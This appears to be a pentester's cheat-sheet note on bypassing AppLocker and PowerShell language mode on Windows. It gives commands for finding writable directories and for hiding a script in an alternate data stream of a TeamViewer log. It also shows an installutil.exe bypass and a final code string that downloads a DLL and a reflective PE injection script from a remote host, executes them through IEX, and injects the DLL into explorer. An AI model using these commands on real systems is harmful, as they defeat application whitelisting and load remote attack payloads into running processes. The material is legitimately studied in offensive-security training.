# Look for perms


- https://www.g0dmode.biz/active-directory-enumeration/applocker-enumeration

- Search for writable directories
```cmd
accesschk.exe "student" C:\Windows -wus
```
- Search for executable directories:
```cmd
icacls.exe C:\Windows\Tasks
```

- alternate data streams
```
type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```

- psh language modes:
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
```

- reflective dll loader, put this in bypass.exe
```
String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
```
